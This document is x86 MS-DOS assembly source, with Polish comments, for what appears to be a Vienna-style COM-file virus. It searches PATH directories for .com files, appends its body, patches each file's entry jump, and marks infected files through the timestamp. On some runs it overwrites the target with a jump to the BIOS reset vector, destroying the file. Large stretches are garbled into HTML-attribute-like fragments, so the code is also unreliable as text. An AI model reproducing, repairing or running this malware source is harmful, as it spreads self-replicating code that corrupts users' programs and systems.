

RET_NEAR_POP	MACRO	X
DB	0C2H
DW	X
ENDM

cseg	segment
	assume	cs:cseg
	org	$+100h

L0100:	JMP	L5BAA

	org	5baah

L5BAA:	PUSH	CX
	MOV	DX,OFFSET L5DA3

	CLD				;odtworzenie zmienionego kawalka
	MOV	SI,DX
	ADD	SI,0AH
	MOV	DI,OFFSET L0100
	MOV	CX,3
	REPZ	MOVSB

	MOV	SI,DX			;baza obszaru danych

	MOV	AH,30H			;Get MS-DOS version number
	INT	21H
	CMP	AL,0			;Major version number
	JNZ	L5BCA
	JMP	L5D91

L5BCA:	PUSH	ES
	MOV	AH,2FH			;Get DTA
	INT	21H
	MOV	DS:[SI],BX		;schowanie starego DTA
	MOV	DS:[SI+2],ES
	POP	ES

	MOV	DX,5FH			;nowe DTA
	NOP
	ADD	DX,SI
	MOV	AH,1AH			;Set DTA
	INT	21H

	PUSH	ES			;<- szukanie="" path="PUSH" si="" mov="" es,ds:2ch="" ;environment="" mov="" di,0="" ;adres="" w="" environmencie="" l5beb:="" pop="" si="" push="" si="" add="" si,1ah="" ;wzorzec="" path="LODSB" mov="" cx,8000h="" repnz="" scasb="" mov="" cx,4="" l5bfa:="" lodsb="" scasb="" jnz="" l5beb="" ;-=""> to nie to
	LOOP	L5BFA
	POP	SI
	POP	ES

	MOV	ds:[SI+16H],DI		;adres zawartosci path'a
	MOV	DI,SI
	ADD	DI,1FH			;obszar roboczy
;	PATCH83
	MOV	BX,SI
	ADD	SI,1FH			;obszar roboczy
	MOV	DI,SI
	JMP	SHORT	L5C50

;<------zmiana katalogu="" l5c16:="" cmp="" word="" ptr="" ds:[si+16h],0="" ;adres="" zawartosci="" path'a="" jnz="" l5c20="" jmp="" l5d83="" l5c20:="" push="" ds="" push="" si="" mov="" ds,es:2ch="" ;segment="" environmentu="" mov="" di,si="" mov="" si,es:[di+16h]="" ;adres="" zawartosci="" path'a="" add="" di,1fh="" ;="" patch83="" l5c32:="" lodsb="" cmp="" al,';'="" ;czy="" koniec="" pozycji="" jz="" l5c41="" cmp="" al,0="" ;koniec="" environmentu="" jz="" l5c3e="" ;-=""> tak
	STOSB
	JMP	SHORT	L5C32

L5C3E:	MOV	SI,0			;znacznik, ze wiecej juz nie ma
L5C41:	POP	BX
	POP	DS
	MOV	ds:[BX+16H],SI		;schowanie nowego pointera
	CMP	BYTE PTR [DI-1],'\'	;czy zakonczone back-slashem
	JZ	L5C50			;-> tak
	MOV	AL,'\'			;uzupelnienie
	STOSB

L5C50:	MOV	ds:[BX+18H],DI		;adres poczatku nazwy zbioru w path
	MOV	SI,BX
	ADD	SI,10H			;'*.com'
	MOV	CX,6
	REPZ	MOVSB
	MOV	SI,BX
	MOV	AH,4EH			;Find First File
	MOV	DX,1FH			;pointer na pathname
	NOP
	ADD	DX,SI
	MOV	CX,3			;Attrributes to match ro+hidden+zwykle
	INT	21H
	JMP	SHORT	L5C74

L5C70:	MOV	AH,4FH			;find next
	INT	21H
L5C74:	JNB	L5C78			;-> znaleziono
	JMP	SHORT	L5C16		;-> na nastepny katalog

L5C78:	MOV	AX,ds:[SI+75H]		;Time file was last written
	AND	AL,1FH			;czy juz zawirusowany ?
	CMP	AL,1FH
	JZ	L5C70				;-> tak, odpuszczamy takim
	CMP	WORD PTR ds:[SI+79H],0FA00h	;low word of file size
	JA	L5C70				;-> odpuszczamy zbyt duzym
	CMP	WORD PTR ds:[SI+79H],0AH
	JB	L5C70			;-> odpuszczamy zbyt malym
	MOV	DI,ds:[SI+18H]		;adres nazwy zbioru w path

	PUSH	SI
	ADD	SI,7DH			;nazwa znalezionego zbioru
L5C9A:	LODSB
	STOSB
	CMP	AL,0
	JNZ	L5C9A
	POP	SI

	MOV	AX,4300h		;Get file attributes
	MOV	DX,1FH			;pathname
	NOP
	ADD	DX,SI
	INT	21H
	MOV	ds:[SI+8],CX		;Attribute byte

	MOV	AX,4301h		;Set attributes
	AND	CX,0FFFEh		;-read/only
	MOV	DX,1FH			;pathname
	NOP
	ADD	DX,SI
	INT	21H

	MOV	AX,3D02h		;Open file/write
	MOV	DX,1FH			;pathname
	NOP
	ADD	DX,SI
	INT	21H
	JNB	L5CCF
	JMP	L5D74

L5CCF:	MOV	BX,AX			;<- open="" o.k.="" mov="" ax,5700h="" ;get="" date="" &="" time="" of="" file="" int="" 21h="" mov="" ds:[si+4],cx="" ;schowanie="" daty="" ostatniej="" modyfikacji="" mov="" ds:[si+6],dx="" mov="" ah,2ch="" ;get="" time="" int="" 21h="" and="" dh,7="" ;ktory="" wariant="" jnz="" l5cf7="" ;-=""> rozmnozenie

					;<- destrukcja="" mov="" ah,40h="" ;write="" handle="" mov="" cx,5="" ;bytes="" mov="" dx,si="" ;pointer="" to="" buffer="" add="" dx,8ah="" int="" 21h="" jmp="" short="" l5d5b="" nop=""></-><- rozmnozenie="" l5cf7:="" mov="" ah,3fh="" ;read="" handle="" mov="" cx,3="" ;bytes="" mov="" dx,0ah="" ;buffer="" offset="" nop="" add="" dx,si="" int="" 21h="" jb="" l5d5b="" ;-=""> blad
	CMP	AX,3			;bytes read
	JNZ	L5D5B			;zbyt malo

	MOV	AX,4202h		;Move file pointer end+offset
	MOV	CX,0			;offset
	MOV	DX,0			;offset
	INT	21H
	JB	L5D5B			;-> blad
	MOV	CX,AX			;adres konca
	SUB	AX,3			;minus dlugosc jump'u
	MOV	ds:[SI+0EH],AX		;nowe 3 pierwsze bajty
	ADD	CX,02F9h
	MOV	DI,SI
	SUB	DI,01F7h
	MOV	[DI],CX			;<- adres="" zmiennych="" mov="" ah,40h="" ;write="" handle="" mov="" cx,0288h="" ;dlugosc="" wirusa="" mov="" dx,si="" ;poczatek="" wirusa="" sub="" dx,01f9h="" int="" 21h="" jb="" l5d5b="" ;-=""> blad

	CMP	AX,0288h		;czy wszystko zapisano
	JNZ	L5D5B			;-> nie
	MOV	AX,4200			;Move file pointer poczatek
	MOV	CX,0			;offset
	MOV	DX,0			;offset
	INT	21H
	JB	L5D5B			;-> blad

	MOV	AH,40H			;write
	MOV	CX,3			;dlugosc
	MOV	DX,SI			;buffer
	ADD	DX,0DH
	INT	21H
L5D5B:	MOV	DX,ds:[SI+6]		;koniec obrobki zbioru
	MOV	CX,ds:[SI+4]
	AND	CX,0FFE0h		;znacznik zawirusowania - czas
	OR	CX,1FH
	MOV	AX,5701h		;Set Date/Time of File
	INT	21H
	MOV	AH,3EH			;Close handle
	INT	21H
					;<- blad="" otwarcia="" zbioru="" l5d74:="" mov="" ax,4301h="" ;set="" file="" attributes="" mov="" cx,ds:[si+8]="" mov="" dx,1fh="" nop="" add="" dx,si="" int="" 21h="" l5d83:="" push="" ds="" mov="" ah,1ah="" ;set="" dta="" mov="" dx,ds:[si+0]="" ;poprzednia="" wartosc="" mov="" ds,ds:[si+2]="" ;poprzednia="" wartosc="" int="" 21h="" pop="" ds="" l5d91:="" pop="" cx=""></-><- gdy="" dos=""></->< 2.0="" xor="" ax,ax="" xor="" bx,bx="" xor="" dx,dx="" xor="" si,si="" mov="" di,0100h="" ;adres="" restartu="" push="" di="" xor="" di,di="" ret_near_pop="" 0ffffh="" l5da3="" label="" word=""><- poczatek="" zmiennych="" programu="" x0000="" equ="" $-l5da3="" dw="" 0080h,440ch="" ;adres="" dta="" oryginalny="" x0004="" equ="" $-l5da3="" dw="" 6d60h="" ;time="" file="" last="" written="" x0006="" equ="" $-l5da3="" dw="" 0a67h="" ;date="" file="" last="" written="" x0008="" dw="" 0020h="" ;file="" attribute="" -="" oryginal="" x000a="" equ="" $-l5da3="" db="" 0e9h,0adh,0bh="" ;schowana="" poprzednia="" zawartosc="" [100h]="" x000d="" equ="" $-l5da3="" db="" 0e9h,0a7h,5ah="" ;zapisywane="" do="" zbioru="" x0010="" equ="" $-l5da3="" db="" '*.com',0="" ;wzorzec="" do="" szukania="" x0016="" equ="" $-l5da3="" dw="" 001ch="" ;adres="" path="w" environmencie="" x0018b="" equ="" $-l5da3="" dw="" 65f3h="" ;adres="" nazwy="" zbioru="" w="" path="" x001f="" x001a="" equ="" $-l5da3="" db="" 'path='			;szukane w environmencie
;---------------------------------------
x001f	equ	$-l5da3
	db	' command.com',0="" ;nazwa="" obrabianego="" zbioru="" db="" 'om',0="" db="" 'm',0="" db="" 'com',0="" db="" 'om',0="" db="" '="" '="" db="" '="" '="" ;----------------------------------------="" x005f="" equ="" $-l5da3=""></-><- nowe="" dta="" db="" 1,'????????com',3,2="" ;reserved="" area="" db="" db="" 0,0,0,0,0,0,0="" db="" 20h="" ;attribute="" found="" x0075="" equ="" $-l5da3="" dw="" 6d60h="" ;time="" file="" was="" last="" written="" dw="" 0a67h="" ;date="" file="" was="" last="" written="" x0079="" equ="" $-l5da3="" dw="" 5aaah="" ;low="" word="" of="" file="" size="" dw="" 0="" ;high="" word="" of="" file="" size="" x007d="" equ="" $-l5da3="" db="" 'command.com',0,0="" ;name="" and="" extension="" ;----------------------------------------="" x008a="" equ="" $-l5da3="" ;zapisywane="" do="" zbioru="" db="" 0eah,0f0h,0ffh,0,0f0h="" ;jmp="" 0f000:0fff0h="" cseg="" ends="" end="" l0100="" =""></-></-></-></-></------zmiana></->